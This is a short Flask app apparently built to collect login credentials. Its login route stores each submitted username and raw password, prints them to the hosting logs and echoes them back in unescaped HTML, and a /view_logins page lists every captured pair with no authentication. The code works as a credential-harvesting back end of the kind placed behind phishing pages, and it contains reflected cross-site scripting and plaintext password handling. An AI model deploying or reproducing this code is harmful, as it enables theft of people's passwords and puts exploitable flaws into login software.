from flask import Flask, request, render_template
import os
from datetime import datetime

app = Flask(__name__, template_folder='templates')

# Store login attempts (in-memory)
login_attempts = []

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')  # Getting raw password
    
    if not username or not password:
        return "Username and password required", 400
    
    # Store attempt with timestamp
    attempt = {
        'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'username': username,
        'password': password  # Storing actual password
    }
    login_attempts.append(attempt)
    
    # Print to console (view in Render logs)
    print(f"New login: {attempt}")
    
    return f"""
    <h2>Login Successful (TESTING ONLY)</h2>
    <p>Username: {username}</p>
    <p>Password: {password}</p>
    <a href="/">Back to login</a>
    """

@app.route('/view_logins')
def view_logins():
    return render_template('logins.html', attempts=login_attempts)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
